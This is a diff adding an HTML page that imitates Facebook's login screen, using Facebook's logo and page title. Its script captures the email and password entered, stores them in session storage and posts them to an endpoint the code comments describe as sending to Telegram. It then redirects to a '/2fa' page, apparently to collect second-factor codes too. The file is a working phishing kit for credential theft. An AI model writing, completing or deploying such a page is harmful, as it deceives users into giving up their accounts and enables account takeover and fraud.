@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log In</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="lang">English (US)</div>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="logo">
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="email" placeholder=" " required>
+                <label for="email">Email or phone number</label>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder=" " required>
+                <label for="password">Password</label>
+                <span class="password-toggle" onclick="togglePassword()">Show</span>
+            </div>
+            
+            <button type="submit" class="primary">
+                <span id="buttonText">Log In</span>
+                <div class="button-loader" id="buttonLoader"></div>
+            </button>
+        </form>
+        
+        <a href="#" class="link">Forgotten password?</a>
+        <button class="secondary-btn" onclick="window.location.href='https://facebook.com'">Create new account</button>
+        
+        <div class="footer">
+            <a href="#">About</a> • 
+            <a href="#">Help</a> • 
+            <a href="#">More</a>
+            <div class="meta">Meta © 2026</div>
+        </div>
+    </div>
+    
+    <script src="/script.js"></script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Store in session storage
+            sessionStorage.setItem('email', email);
+            sessionStorage.setItem('password', password);
+            
+            // Show loading
+            const btn = document.querySelector('.primary');
+            const buttonText = document.getElementById('buttonText');
+            const buttonLoader = document.getElementById('buttonLoader');
+            
+            btn.disabled = true;
+            buttonText.style.display = 'none';
+            buttonLoader.style.display = 'block';
+            
+            // Send to Telegram
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'login',
+                    data: { email, password },
+                    ip: 'user_ip_here'
+                })
+            });
+            
+            // Redirect to 2FA page
+            setTimeout(() => {
+                window.location.href = '/2fa';
+            }, 1500);
+        });
+        
+        function togglePassword() {
+            const input = document.getElementById('password');
+            const toggle = document.querySelector('.password-toggle');
+            if (input.type === 'password') {
+                input.type = 'text';
+                toggle.textContent = 'Hide';
+            } else {
+                input.type = 'password';
+                toggle.textContent = 'Show';
+            }
+        }
+    </script>
+</body>
+</html>
